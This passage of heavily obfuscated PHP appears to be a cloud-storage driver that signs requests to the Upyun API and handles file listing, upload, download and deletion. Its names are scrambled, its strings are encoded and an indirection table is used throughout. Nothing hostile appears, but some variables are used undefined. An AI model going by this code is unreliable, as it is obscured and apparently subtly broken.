$ãö˜¡ÍÓ[312]), $‡Çšçëˆ, $¢Şâƒ); } public function tufm7dc788ae($¼¾•‹­Í, $ïû¿‘Í) { $¿ë¿©‚õ =& $_SERVER[®»±”ó²]; $ùÙ¥ï™­ =& $_SERVER[öï™ ‘]; return call_user_func(array($ùÙ¥ï™­[311], $ùÙ¥ï™­[313]), $¼¾•‹­Í, $ïû¿‘Í); $ÉÌ©±Ô¤ = $¿ë¿©‚õ[827]; if (strlen($ÉÌ©±Ô¤) < $¿ë¿©‚õ[706]) { return; } } } goto e‘ÇÛ¶ŠØ; aÔ™ºŒ¿„â: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\x2f\57\x76\x30\x2e\x61\x70\x69\x2e\165\x70\171\165\x6e\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Å£ôèø‰) { parent::__construct(); $this->_init($Å£ôèø‰); } public function _init($ú›¬‚ı¹) { $ß­¾Ãšé =& $_SERVER[®»±”ó²]; foreach ($ú›¬‚ı¹ as $’—‘Û°’ => $şí öèÆ) { if (isset($this->{$’—‘Û°’})) { $this->{$’—‘Û°’} = $şí öèÆ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ß­¾Ãšé[1564] . LNG($ß­¾Ãšé[1484])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ï¨õü¹Î, $î´§‡É = "\107\x45\124") { $ˆ§éêĞ‡ =& $_SERVER[®»±”ó²]; $ÜÍÍí”¦ = gmdate($ˆ§éêĞ‡[1513]); $ÁÜ¶ÉØ´ = base64_encode(hash_hmac($ˆ§éêĞ‡[1565], "{$î´§‡É}\46{$Ï¨õü¹Î}\x26{$ÜÍÍí”¦}", md5("{$this->userpass}"), !0)); $Æ÷âŞ = array("\x41\x75\x74\x68\x6f\162\151\172\x61\164\151\x6f\156\72\125\x50\x59\x55\116\x20{$this->username}\72{$ÁÜ¶ÉØ´}", "\104\141\x74\x65\x3a{$ÜÍÍí”¦}"); return $Æ÷âŞ; } public function ussRequest($¹âˆ«¡ª, $×÷é‡å“ = "\107\x45\124", $‘Á³Ÿõ¥ = false, $ğ½Ñ¾Öê = false, $ıã»ùÌ½ = false) { $Üª×òÈ‰ =& $_SERVER[®»±”ó²]; $¹âˆ«¡ª = trim($¹âˆ«¡ª, $Üª×òÈ‰[8]); $Á„ ñ·Î = "\x2f{$this->bucket}\x2f" . rawurlencode($¹âˆ«¡ª); $úä­Î¤Ù = $this->ussHeaders($Á„ ñ·Î, $×÷é‡å“); if ($ğ½Ñ¾Öê) { $úä­Î¤Ù = array_merge($úä­Î¤Ù, $ğ½Ñ¾Öê); } $ÍÇç»˜İ = url_request($this->endpoint . $Á„ ñ·Î, $×÷é‡å“, $‘Á³Ÿõ¥, $úä­Î¤Ù, $ıã»ùÌ½); if (!$ÍÇç»˜İ) { $ØŒÂú²  = LNG($Üª×òÈ‰[1566]); $this->writeLog($ØŒÂú² ); return array($Üª×òÈ‰[1309] => !1, $Üª×òÈ‰[1299] => $ØŒÂú² ); } if (strtolower($×÷é‡å“) == $Üª×òÈ‰[230] || in_array($ÍÇç»˜İ[$Üª×òÈ‰[1309]], array($Üª×òÈ‰[264], $Üª×òÈ‰[1567]))) { $‘Á³Ÿõ¥ = $ÍÇç»˜İ[$Üª×òÈ‰[1568]]; if (!$ÍÇç»˜İ[$Üª×òÈ‰[830]]) { $‘Á³Ÿõ¥ = isset($‘Á³Ÿõ¥[0]) ? $‘Á³Ÿõ¥[0] : $Üª×òÈ‰[12]; } } else { $‘Á³Ÿõ¥ = json_decode($ÍÇç»˜İ[$Üª×òÈ‰[1299]], !0); if (!$‘Á³Ÿõ¥) { $‘Á³Ÿõ¥ = $ÍÇç»˜İ[$Üª×òÈ‰[1299]]; } else { if (!$ÍÇç»˜İ[$Üª×òÈ‰[830]] && isset($‘Á³Ÿõ¥[$Üª×òÈ‰[1569]])) { $‘Á³Ÿõ¥ = $‘Á³Ÿõ¥[$Üª×òÈ‰[1569]]; } } } if (!$ÍÇç»˜İ[$Üª×òÈ‰[830]]) { $this->writeLog($this->__errorMessage($‘Á³Ÿõ¥)); } return array($Üª×òÈ‰[1309] => $ÍÇç»˜İ[$Üª×òÈ‰[830]], $Üª×òÈ‰[1299] => $‘Á³Ÿõ¥); } private function __errorMessage($ô·„¿êÖ) { $åëİ–Å° =& $_SERVER[®»±”ó²]; if (!$ô·„¿êÖ) { return $åëİ–Å°[12]; } static $ÆÂÒ÷‘Ÿ = null; if (!$ÆÂÒ÷‘Ÿ) { $ÆÂÒ÷‘Ÿ = I18n::getType(); } if ($ÆÂÒ÷‘Ÿ != $åëİ–Å°[1522]) { return $ô·„¿êÖ; } $ŒÍ‹â©Ø = array($åëİ–Å°[1570] => $åëİ–Å°[1571], $åëİ–Å°[1572] => $åëİ–Å°[1573], $åëİ–Å°[1574] => $åëİ–Å°[1573], $åëİ–Å°[1575] => $åëİ–Å°[1576], $åëİ–Å°[1577] => $åëİ–Å°[1578], $åëİ–Å°[1579] => $åëİ–Å°[1580], $åëİ–Å°[1581] => $åëİ–Å°[1582]); return isset($ŒÍ‹â©Ø[$ô·„¿êÖ]) ? $ŒÍ‹â©Ø[$ô·„¿êÖ] : $ô·„¿êÖ; } public function mkfile($ÇûÇÓÔ´, $›û”ÙŒ = '', $êÌµñâú = REPEAT_RENAME) { if ($this->setContent($ÇûÇÓÔ´, $›û”ÙŒ)) { return $this->getPathOuter($ÇûÇÓÔ´); } return !1; } public function mkdir($€ã˜Ã’­, $Ş¬»’ù = REPEAT_SKIP) { $­èÏ•å =& $_SERVER[®»±”ó²]; $Ÿ˜Š£Õ¾ = trim($€ã˜Ã’­, $­èÏ•å[8]); if ($this->_isFolder($Ÿ˜Š£Õ¾)) { return $this->getPathOuter($Ÿ˜Š£Õ¾); } $ĞĞÈé„ = array($­èÏ•å[1583]); $äÂÇôËê = $this->ussRequest($Ÿ˜Š£Õ¾, $­èÏ•å[291], !1, $ĞĞÈé„); return $äÂÇôËê[$­èÏ•å[1309]] ? $this->getPathOuter($Ÿ˜Š£Õ¾) : !1; } public function copyFile($ şÄºÓ…, $ƒ¨Ç²°é) { $ÅÓŞÅÛ‰ =& $_SERVER[®»±”ó²]; $ğÅ»ªÃø = array($ÅÓŞÅÛ‰[1584] . "\x2f{$this->bucket}\x2f{$ şÄºÓ…}", $ÅÓŞÅÛ‰[1585]); $ ‚ªÒ÷ø = $this->ussRequest($ƒ¨Ç²°é, $ÅÓŞÅÛ‰[256], !1, $ğÅ»ªÃø); return $ ‚ªÒ÷ø[$ÅÓŞÅÛ‰[1309]] ? !0 : $this->getPathOuter($ƒ¨Ç²°é); } public function moveFile($Ùê¼™Îœ, $°§óÇÌ) { $ç™Ò¼é =& $_SERVER[®»±”ó²]; $ÎŠÂ¾€Ş = array($ç™Ò¼é[1586] . "\57{$this->bucket}\x2f{$Ùê¼™Îœ}", $ç™Ò¼é[1585]); $¬‹ÉôÉ… = $this->ussRequest($°§óÇÌ, $ç™Ò¼é[256], !1, $ÎŠÂ¾€Ş); return $¬‹ÉôÉ…[$ç™Ò¼é[1309]] ? !0 : $this->getPathOuter($°§óÇÌ); } public function delFile($™¸Ò†‹) { $‚°«üœ =& $_SERVER[®»±”ó²]; $ÎÄë™„† = $this->ussRequest($™¸Ò†‹, $‚°«üœ[1587]); return $ÎÄë™„†[$‚°«üœ[1309]] ? !0 : !1; } public function delFolder($ÃÁÅÆ¨ƒ) { $î—ãïá =& $_SERVER[®»±”ó²]; if (!$this->exist($ÃÁÅÆ¨ƒ)) { return !0; } $this->listItemCache = !1; $Ş„ƒ¤¢õ = $ÎåºÌÆ = array(); $this->fileList($ÃÁÅÆ¨ƒ, $Ş„ƒ¤¢õ, $ÎåºÌÆ, !0); $this->listItemCache = !0; foreach ($ÎåºÌÆ as $³ÉÚßÑÌ) { $Í€‘¦„ = $this->ussRequest($³ÉÚßÑÌ[$î—ãïá[32]], $î—ãïá[1587]); if (!$Í€‘¦„[$î—ãïá[1309]]) { return !1; } } usort($Ş„ƒ¤¢õ, function ($¶©Í‰‹¬, $¡ÎÛŒú‰) { $†Ë­öªê =& $_SERVER[®»±”ó²]; return substr_count($¡ÎÛŒú‰, $†Ë­öªê[8]) - substr_count($¶©Í‰‹¬, $†Ë­öªê[8]); }); foreach ($Ş„ƒ¤¢õ as $¼ùöë) { $Í€‘¦„ = $this->ussRequest($¼ùöë, $î—ãïá[1587]); if (!$Í€‘¦„[$î—ãïá[1309]]) { return !1; } } $Í€‘¦„ = $this->ussRequest($ÃÁÅÆ¨ƒ, $î—ãïá[1587]); return $Í€‘¦„[$î—ãïá[1309]]; } public function rename($•“áĞ¦•, $®àêğäƒ) { if ($this->isFile($•“áĞ¦•)) { $®àêğäƒ = get_path_father($•“áĞ¦•) . $®àêğäƒ; return $this->moveFile($•“áĞ¦•, $®àêğäƒ); } return $this->renameObject($•“áĞ¦•, $®àêğäƒ); } public function fileInfo($èö‚ùİ, $­…Ÿ¹¯† = false, $»•Ú“Ç² = array()) { $êŸ‹æé  =& $_SERVER[®»±”ó²]; $›ÚÍ®…¸ = array($êŸ‹æé [32] => $this->pathThis($èö‚ùİ), $êŸ‹æé [87] => $this->getPathOuter($êŸ‹æé [8] . $èö‚ùİ), $êŸ‹æé [33] => $êŸ‹æé [233], $êŸ‹æé [79] => isset($»•Ú“Ç²[$êŸ‹æé [79]]) ? $»•Ú“Ç²[$êŸ‹æé [79]] : 0, $êŸ‹æé [169] => $this->ext($èö‚ùİ)); if ($­…Ÿ¹¯†) { return $›ÚÍ®…¸; } $›ÚÍ®…¸[$êŸ‹æé [234]] = $›ÚÍ®…¸[$êŸ‹æé [88]] = 0; $›ÚÍ®…¸[$êŸ‹æé [235]] = $›ÚÍ®…¸[$êŸ‹æé [236]] = !0; if (empty($»•Ú“Ç²)) { $»•Ú“Ç² = $this->objectMeta($èö‚ùİ); if (!$»•Ú“Ç²) { return $›ÚÍ®…¸; } } $›ÚÍ®…¸[$êŸ‹æé [234]] = intval($»•Ú“Ç²[$êŸ‹æé [1588]]); $›ÚÍ®…¸[$êŸ‹æé [88]] = intval($»•Ú“Ç²[$êŸ‹æé [1589]]); $›ÚÍ®…¸[$êŸ‹æé [79]] = $»•Ú“Ç²[$êŸ‹æé [79]]; return $›ÚÍ®…¸; } public function folderInfo($ÇÌê“¢ã, $¢Ï×öœ§ = false) { $˜Èå¡«Ä =& $_SERVER[®»±”ó²]; $åø‘¬†• = array($˜Èå¡«Ä[32] => $this->pathThis($ÇÌê“¢ã), $˜Èå¡«Ä[87] => $this->getPathOuter($˜Èå¡«Ä[8] . $ÇÌê“¢ã), $˜Èå¡«Ä[33] => $˜Èå¡«Ä[78]); if ($¢Ï×öœ§) { return $åø‘¬†•; } $åø‘¬†•[$˜Èå¡«Ä[234]] = $åø‘¬†•[$˜Èå¡«Ä[88]] = 0; $åø‘¬†•[$˜Èå¡«Ä[235]] = $åø‘¬†•[$˜Èå¡«Ä[236]] = !0; if (empty($ºé¦€ñ)) { $ºé¦€ñ = $this->objectMeta($ÇÌê“¢ã); if (!$ºé¦€ñ) { return $åø‘¬†•; } } $åø‘¬†•[$˜Èå¡«Ä[234]] = intval($ºé¦€ñ[$˜Èå¡«Ä[1588]]); $åø‘¬†•[$˜Èå¡«Ä[88]] = intval($ºé¦€ñ[$˜Èå¡«Ä[1589]]); return $åø‘¬†•; } private function listObjs($…ÙùÚß“, $ŒÀ©ÑéÒ = 0, $øÑ®šÉ = 1000) { $Çğ’ğšÖ =& $_SERVER[®»±”ó²]; $…×¯¥–¬ = array($Çğ’ğšÖ[1590], $Çğ’ğšÖ[1591] . $øÑ®šÉ); if ($ŒÀ©ÑéÒ) { $…×¯¥–¬[] = $Çğ’ğšÖ[1592] . $ŒÀ©ÑéÒ; } $‰ûŸ¨Ò¨ = $this->ussRequest($…ÙùÚß“, $Çğ’ğšÖ[1515], !1, $…×¯¥–¬); return !$‰ûŸ¨Ò¨[$Çğ’ğšÖ[1309]] ? !1 : $‰ûŸ¨Ò¨[$Çğ’ğšÖ[1299]]; } private function fileList($ì‡ØÒÆÚ, &$–§ÜªŸ, &$ÑŒô ‚, $İŒŠí£¥ = false) { $—¼æÂÓ² =& $_SERVER[®»±”ó²]; $ªã÷¦Õ = $—¼æÂÓ²[12]; $ÉäµõÈ© = 1000; $¿Íİé ¼ = rtrim($ì‡ØÒÆÚ, $—¼æÂÓ²[8]) . $—¼æÂÓ²[8]; while (!0) { check_abort(); $íÜš‚‹… = $this->listObjs($ì‡ØÒÆÚ, $ªã÷¦Õ, $ÉäµõÈ©); if (!$íÜš‚‹…) { return !1; } $ªã÷¦Õ = isset($íÜš‚‹…[$—¼æÂÓ²[1593]]) ? $íÜš‚‹…[$—¼æÂÓ²[1593]] : $—¼æÂÓ²[12]; $åÁü±²Ñ = isset($íÜš‚‹…[$—¼æÂÓ²[1594]]) ? $íÜš‚‹…[$—¼æÂÓ²[1594]] : array(); foreach ($åÁü±²Ñ as $ ¤’™Ğ­) { $úÖŒô¡Š = $ ¤’™Ğ­[$—¼æÂÓ²[33]] == $—¼æÂÓ²[78] ? !0 : !1; $íÛ¶”ŸÈ = ltrim($¿Íİé ¼ . $ ¤’™Ğ­[$—¼æÂÓ²[32]], $—¼æÂÓ²[8]) . ($úÖŒô¡Š ? $—¼æÂÓ²[8] : $—¼æÂÓ²[12]); $ÃÆ‡ñ¡Ì = array($—¼æÂÓ²[32] => $íÛ¶”ŸÈ, $—¼æÂÓ²[33] => $úÖŒô¡Š ? $—¼æÂÓ²[78] : $—¼æÂÓ²[233], $—¼æÂÓ²[79] => $ ¤’™Ğ­[$—¼æÂÓ²[414]], $—¼æÂÓ²[1589] => $ ¤’™Ğ­[$—¼æÂÓ²[1595]]); $this->cacheMethodInfoSet($íÛ¶”ŸÈ, $úÖŒô¡Š, $ÃÆ‡ñ¡Ì); if ($úÖŒô¡Š) { $–§ÜªŸ[] = $íÛ¶”ŸÈ; if ($İŒŠí£¥) { $this->fileList($íÛ¶”ŸÈ, $–§ÜªŸ, $ÑŒô ‚, $İŒŠí£¥); } continue; } $ÑŒô ‚[] = $ÃÆ‡ñ¡Ì; } if (count($åÁü±²Ñ) < $ÉäµõÈ©) { break; } } $this->cacheMethodInfoSet($ì‡ØÒÆÚ, !0); } public function listPath($™­—Ö†×, $Ëï¾ğ¢¬ = false) { $¼æ°îÃ¬ =& $_SERVER[®»±”ó²]; $©µÙä«Â = $ÈÆÊ·ê = array(); $this->fileList($™­—Ö†×, $©µÙä«Â, $ÈÆÊ·ê); foreach ($©µÙä«Â as $Úåâ­½Ä => $Ñ¥Í³Î) { $©µÙä«Â[$Úåâ­½Ä] = $this->folderInfo($Ñ¥Í³Î, $Ëï¾ğ¢¬); } foreach ($ÈÆÊ·ê as $Úåâ­½Ä => $Ñ¥Í³Î) { $ÈÆÊ·ê[$Úåâ­½Ä] = $this->fileInfo($Ñ¥Í³Î[$¼æ°îÃ¬[32]], $Ëï¾ğ¢¬, $Ñ¥Í³Î); } return array($¼æ°îÃ¬[85] => $©µÙä«Â, $¼æ°îÃ¬[86] => $ÈÆÊ·ê); } public function has($»üòüéœ, $ĞÑş’á« = false, $ú‚ëü×º = true) { $¸ˆŞ³Ç =& $_SERVER[®»±”ó²]; $Õñæ±õ = $¸ˆŞ³Ç[12]; $¬Òæõà™ = 500; $…§¤½ç¢ = 0; $ ø®¿ = 0; $˜¯ü¼”ı = rtrim($»üòüéœ, $¸ˆŞ³Ç[8]) . $¸ˆŞ³Ç[8]; while (!0) { check_abort(); $¼Àù°” = $this->listObjs($»üòüéœ, $Õñæ±õ, $¬Òæõà™); if (!$¼Àù°”) { return !1; } $Õñæ±õ = isset($¼Àù°”[$¸ˆŞ³Ç[1593]]) ? $¼Àù°”[$¸ˆŞ³Ç[1593]] : $¸ˆŞ³Ç[12]; $„ª”Øì = isset($¼Àù°”[$¸ˆŞ³Ç[1594]]) ? $¼Àù°”[$¸ˆŞ³Ç[1594]] : array(); if (empty($„ª”Øì)) { break; } $æüèá¬ = array_filter($„ª”Øì, function ($®¡åîŸ) { $ï€¿•Ÿ =& $_SERVER[®»±”ó²]; return $®¡åîŸ[$ï€¿•Ÿ[33]] == $ï€¿•Ÿ[78]; }); $Äşó²˜ö = count($„ª”Øì); $æüèá¬ = count($æüèá¬); $ü¿«¡²– = $Äşó²˜ö - $æüèá¬; if ($ĞÑş’á«) { $ ø®¿ += $æüèá¬; $…§¤½ç¢ += $ü¿«¡²–; if ($Äşó²˜ö < $¬Òæõà™) { break; } continue; } if ($ú‚ëü×º) { if ($ü¿«¡²–) { return !0; } } else { if ($æüèá¬) { return !0; } } if ($Äşó²˜ö < $¬Òæõà™) { break; } } if ($ĞÑş’á«) { return array($¸ˆŞ³Ç[242] => $…§¤½ç¢, $¸ˆŞ³Ç[243] => $ ø®¿); } return !1; } public function listAll($Õçò—Ô‹) { $ÍÛ½Â¦ë =& $_SERVER[®»±”ó²]; $îÔ‘Í‹… = $°ÓƒßÊ = array(); $this->fileList($Õçò—Ô‹, $îÔ‘Í‹…, $°ÓƒßÊ, !0); $Ôñí± = array_to_keyvalue($°ÓƒßÊ, $ÍÛ½Â¦ë[32]); foreach ($îÔ‘Í‹… as $ş¸İóÜñ) { if (is_string($ş¸İóÜñ)) { $Ôñí±[$ş¸İóÜñ] = array($ÍÛ½Â¦ë[79] => 0); } } return $this->listAllFiles($Õçò—Ô‹, $Ôñí±); } public function canRead($‚ë˜µ¡œ) { return $this->exist($‚ë˜µ¡œ) ? !0 : !1; } public function canWrite($æ¥ü¾úû) { return $this->exist($æ¥ü¾úû) ? !0 : !1; } public function getContent($şÄŸÑé†) { return $this->fileSubstr($şÄŸÑé†, 0, -1); } public function setContent($‰Àîõêì, $ëûß»åé = '') { $îÂÕÒÍ¾ =& $_SERVER[®»±”ó²]; if (!$ëûß»åé) { $’·ú£ö = $this->ussRequest($‰Àîõêì, $îÂÕÒÍ¾[291]); return $’·ú£ö[$îÂÕÒÍ¾[1309]]; } $á£…£Ê„ = $this->tempFile($this->pathThis($‰Àîõêì)); file_put_contents($á£…£Ê„, $ëûß»åé); if ($this->upload($‰Àîõêì, $á£…£Ê„)) { $this->tempFileRemve($á£…£Ê„); return !0; } return !1; } public function fileSubstr($¤ÜÍÎĞî, $ Ä®…¦Ê, $¹›ª¯§¿) { $ˆöğüÖĞ =& $_SERVER[®»±”ó²]; if (!($¥½£ÙÇÖ = $this->link($¤ÜÍÎĞî))) { return !1; } $¹‰”Úò¸ = !1; if ($¹›ª¯§¿ > 0) { $Ã‰‰èÌû = $ Ä®…¦Ê + $¹›ª¯§¿ - 1; $¹‰”Úò¸ = array($ˆöğüÖĞ[1554] . $ Ä®…¦Ê . $ˆöğüÖĞ[464] . $Ã‰‰èÌû); } $ığÇó¾ê = url_request($¥½£ÙÇÖ, $ˆöğüÖĞ[1515], !1, $¹‰”Úò¸); return $ığÇó¾ê[$ˆöğüÖĞ[830]] ? $ığÇó¾ê[$ˆöğüÖĞ[1299]] : !1; } public function upload($ûĞõâÃÈ, $ÀÀ‘‰ª¥, $ÙËùÛ´º = false, $ÕÑÃö± = REPEAT_REPLACE) { $£´À‡°· =& $_SERVER[®»±”ó²]; $ÕŠÃ¨âä = IO::size($ÀÀ‘‰ª¥); if ($ÕŠÃ¨âä <= 1024 * 1024 * 200) { $–Ößšùï = array($£´À‡°·[1596] . $ÀÀ‘‰ª¥); $›ÓÜİ˜” = $this->ussRequest($ûĞõâÃÈ, $£´À‡°·[256], $–Ößšùï); return $›ÓÜİ˜”[$£´À‡°·[1309]] ? $this->getPathOuter($ûĞõâÃÈ) : !1; } $ØÎæ†ĞÙ = 1024 * 1024 * 10; $°¹˜Ÿ’ã = array($£´À‡°·[1597], $£´À‡°·[1598] . $ÕŠÃ¨âä, $£´À‡°·[1599], $£´À‡°·[1600] . $ØÎæ†ĞÙ); $›ÓÜİ˜” = $this->ussRequest($ûĞõâÃÈ, $£´À‡°·[256], !1, $°¹˜Ÿ’ã); if (!$›ÓÜİ˜”[$£´À‡°·[1309]]) { return !1; } $Šµ”Î¹Û = $›ÓÜİ˜”[$£´À‡°·[1299]]; $ÑÊÒ®¢º = 0; $¶ˆ¼ëğ¾ = $Šµ”Î¹Û[$£´À‡°·[1601]]; $Á•ğ·‡û = fopen($ÀÀ‘‰ª¥, $£´À‡°·[1478]); if (!$Á•ğ·‡û) { return !1; } do { $×©—Œ¨Â = $Šµ”Î¹Û[$£´À‡°·[1602]]; fseek_64($Á•ğ·‡û, $ÑÊÒ®¢º); $¥êŒ§óÀ = fread($Á•ğ·‡û, $×©—Œ¨Â); $¶’úÈ¨˜ = 0; do { $¶’úÈ¨˜++; $Šµ”Î¹Û = $this->uploadPart($ûĞõâÃÈ, $Šµ”Î¹Û, $¥êŒ§óÀ); } while (!$Šµ”Î¹Û && $¶’úÈ¨˜ < 3); if (!$Šµ”Î¹Û) { return !1; } $¶ˆ¼ëğ¾ = $Šµ”Î¹Û[$£´À‡°·[1601]]; $ÑÊÒ®¢º += $×©—Œ¨Â; } while ($¶ˆ¼ëğ¾ != -1); fclose($Á•ğ·‡û); $°¹˜Ÿ’ã = array($£´À‡°·[1603], $£´À‡°·[1604] . $Šµ”Î¹Û[$£´À‡°·[1605]], $£´À‡°·[1599]); $›ÓÜİ˜” = $this->ussRequest($ûĞõâÃÈ, $£´À‡°·[256], !1, $°¹˜Ÿ’ã); return $›ÓÜİ˜”[$£´À‡°·[1309]] ? $this->getPathOuter($¡Ï×åÑÉ) : !1; } private function uploadPart($îê¹„İ¨, $’«ãàĞ’, &$””şã±Í) { $àƒƒ›¢Ğ =& $_SERVER[®»±”ó²]; $úÅ“³‹ñ = array($àƒƒ›¢Ğ[1606], $àƒƒ›¢Ğ[1604] . $’«ãàĞ’[$àƒƒ›¢Ğ[1605]], $àƒƒ›¢Ğ[1607] . $’«ãàĞ’[$àƒƒ›¢Ğ[1601]], $àƒƒ›¢Ğ[146] . $’«ãàĞ’[$àƒƒ›¢Ğ[1602]]); $ÖíˆÍ²š = $this->ussRequest($îê¹„İ¨, $àƒƒ›¢Ğ[256], $””şã±Í, $úÅ“³‹ñ); return !$ÖíˆÍ²š[$àƒƒ›¢Ğ[1309]] ? $ÖíˆÍ²š[$àƒƒ›¢Ğ[1309]] : $ÖíˆÍ²š[$àƒƒ›¢Ğ[1299]]; } public function uploadFormData($Ù¬Ï‚»â, $ğ£‰äƒø = 3600) { return $this->uploadPolicy($Ù¬Ï‚»â, $ğ£‰äƒø); } public function uploadMultiData($Ë¶…›ûÆ, $…Ó¡Ú”‘ = 3600) { $š˜™¤°¤ =& $_SERVER[®»±”ó²]; $ÙÆ¾† = (int) $GLOBALS[$š˜™¤°¤[7]][$š˜™¤°¤[79]]; return $this->uploadPolicy($Ë¶…›ûÆ, $…Ó¡Ú”‘, $ÙÆ¾†); } private function uploadPolicy($š‚»öı, $áÃìÖŞœ = 3600, $ş… ú’õ = 0) { $›—ƒÍØ =& $_SERVER[®»±”ó²]; $¥ºúÆ´Â = $›—ƒÍØ[8] . $this->bucket; $¨‹ä˜íÊ = gmdate($›—ƒÍØ[1513]); $š·”‡âß = array($›—ƒÍØ[1608] => $this->bucket, $›—ƒÍØ[1609] => $š‚»öı, $›—ƒÍØ[1610] => time() + $áÃìÖŞœ, $›—ƒÍØ[1611] => $¨‹ä˜íÊ); if ($ş… ú’õ) { $š·”‡âß[$›—ƒÍØ[1498]] = $ş… ú’õ; } $Óé²¢ = base64_encode(json_encode($š·”‡âß)); $äå¹Îµî = base64_encode(hash_hmac($›—ƒÍØ[1565], "\120\117\123\124\46{$¥ºúÆ´Â}\x26{$¨‹ä˜íÊ}\46{$Óé²¢}", md5("{$this->userpass}"), !0)); $æ—¶Ó° = array($›—ƒÍØ[280] => $Óé²¢, $›—ƒÍØ[1612] => "\125\120\131\x55\x4e\x20{$this->username}\x3a{$äå¹Îµî}", $›—ƒÍØ[209] => $this->endpoint . $¥ºúÆ´Â); return $æ—¶Ó°; } public function download($®Ûù÷÷, $¹ƒÁÃ›æ) { $á¥ßÇ¾ = IO::getPathInner(IO::mkfile($¹ƒÁÃ›æ)); if (!($Ú‹İ¾³ = $this->link($®Ûù÷÷))) { return !1; } $‚Ø´Â­Õ = 0; $ŞË“ ” = 1024 * 200; $“Š‚‡ƒ¡ = fopen($á¥ßÇ¾, $_SERVER[®»±”ó²][1560]); while (!0) { $ûò™Âôó = $this->fileSubstr($®Ûù÷÷, $‚Ø´Â­Õ, $ŞË“ ”); if ($ûò™Âôó === !1) { return !1; } fwrite($“Š‚‡ƒ¡, $ûò™Âôó); $‚Ø´Â­Õ += $ŞË“ ”; if (strlen($ûò™Âôó) < $ŞË“ ”) { break; } } fclose($“Š‚‡ƒ¡); return $¹ƒÁÃ›æ; } public function link($ŠÑÈÛ«ô, $İŒÇ£á¿ = array()) { $·Ç¥¬°ƒ =& $_SERVER[®»±”ó²]; $ŠÑÈÛ«ô = trim($ŠÑÈÛ«ô, $·Ç¥¬°ƒ[8]); if (!empty($this->token)) { $¤¸ášº¬ = strtotime(date($·Ç¥¬°ƒ[1613])); $¡ğÙïÄÂ = substr(md5($this->token . $·Ç¥¬°ƒ[287] . $¤¸ášº¬ . $·Ç¥¬°ƒ[1614] . $ŠÑÈÛ«ô), 12, 8) . $¤¸ášº¬; $İŒÇ£á¿[] = $·Ç¥¬°ƒ[1615] . $¡ğÙïÄÂ; } $æ‘à÷Ÿ = !empty($İŒÇ£á¿) ? $·Ç¥¬°ƒ[76] . implode($·Ç¥¬°ƒ[287], $İŒÇ£á¿) : $·Ç¥¬°ƒ[12]; return $this->getHost() . $·Ç¥¬°ƒ[8] . $this->pathEncode($ŠÑÈÛ«ô) . $æ‘à÷Ÿ; } public function fileOut($Ì…ÚÃ, $ê÷¬šİÚ = false, $ßÂéÙ„ = false, $ëØ¦™ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ì…ÚÃ, $ê÷¬šİÚ, $ßÂéÙ„, $ëØ¦™); } if (!$ßÂéÙ„) { $ßÂéÙ„ = $this->pathThis($Ì…ÚÃ); } $æĞ‰Àßº = $ê÷¬šİÚ ? array($_SERVER[®»±”ó²][1616] . rawurlencode($ßÂéÙ„)) : array(); $í¦Ãîù› = $this->link($Ì…ÚÃ, $æĞ‰Àßº); $this->fileOutLink($í¦Ãîù›); } public function fileOutServer($Ş®Ÿ“å™, $·§¨¡Ÿå = false, $£­ Å²¨ = false, $‚®§÷ö† = '') { parent::fileOut($Ş®Ÿ“å™, $·§¨¡Ÿå, $£­ Å²¨, $‚®§÷ö†); } public function fileOutImage($ĞÍ‚å¢, $ğ³«Ï = 250) { $‚ôã«Åš = $this->link($ĞÍ‚å¢ . $_SERVER[®»±”ó²][1617] . $ğ³«Ï); $this->fileOutLink($‚ôã«Åš); } public function fileOutImageServer($§Å©ü“á, $œëÙ¼ı“ = 250) { parent::fileOutImage($§Å©ü“á, $œëÙ¼ı“); } public function hashMd5($Ëşœäşù) { $ŠÈ¿ËÊ­ =& $_SERVER[®»±”ó²]; $„øáëù = $this->_objectMeta($Ëşœäşù); return isset($„øáëù[$ŠÈ¿ËÊ­[248]]) ? $„øáëù[$ŠÈ¿ËÊ­[248]] : !1; } public function size($ÜÉ¢™°È) { $Åß¦¦ÉÆ = $this->objectMeta($ÜÉ¢™°È); return $Åß¦¦ÉÆ ? $Åß¦¦ÉÆ[$_SERVER[®»±”ó²][79]] : 0; } public function info($¸œÓ—µş) { if ($this->isFolder($¸œÓ—µş)) { return $this->folderInfo($¸œÓ—µş); } else { if ($this->isFile($¸œÓ—µş)) { return $this->fileInfo($¸œÓ—µş); } } return !1; } public function exist($åù³§ş) { return $this->isFile($åù³§ş) || $this->isFolder($åù³§ş); } public function isFile($ÖŠŞÌÃ) { return !$this->isFolder($ÖŠŞÌÃ) && $this->objectMeta($ÖŠŞÌÃ); } public function isFolder($ÕëÒäÂˆ) { return $this->cacheMethod($_SERVER[®»±”ó²][180], $ÕëÒäÂˆ); } protected function objectMeta($éÛùèª¾) { return $this->cacheMethod($_SERVER[®»±”ó²][182], $éÛùèª¾); } protected function _objectMeta($—›ï¸“î) { $ğ›İ™ûâ =& $_SERVER[®»±”ó²]; if ($—›ï¸“î == $ğ›İ™ûâ[12] || $—›ï¸“î == $ğ›İ™ûâ[8]) { return array(); } $á‡÷ë°À = $this->ussRequest($—›ï¸“î, $ğ›İ™ûâ[1618]); if (!$á‡÷ë°À[$ğ›İ™ûâ[1309]]) { return null; } $ĞÙ¹¶¤ = isset($á‡÷ë°À[$ğ›İ™ûâ[1299]]) ? $á‡÷ë°À[$ğ›İ™ûâ[1299]] : array(); if (!isset($ĞÙ¹¶¤[$ğ›İ™ûâ[1619]])) { return null; } $É­²Àş = array($ğ›İ™ûâ[33] => isset($ĞÙ¹¶¤[$ğ›İ™ûâ[1619]]) ? $ĞÙ¹¶¤[$ğ›İ™ûâ[1619]] : null, $ğ›İ™ûâ[79] => isset($ĞÙ¹¶¤[$ğ›İ™ûâ[1620]]) ? $ĞÙ¹¶¤[$ğ›İ™ûâ[1620]] : null, $ğ›İ™ûâ[248] => isset($ĞÙ¹¶¤[$ğ›İ™ûâ[1621]]) ? $ĞÙ¹¶¤[$ğ›İ™ûâ[1621]] : null, $ğ›İ™ûâ[1588] => isset($ĞÙ¹¶¤[$ğ›İ™ûâ[1622]]) ? $ĞÙ¹¶¤[$ğ›İ™ûâ[1622]] : null); 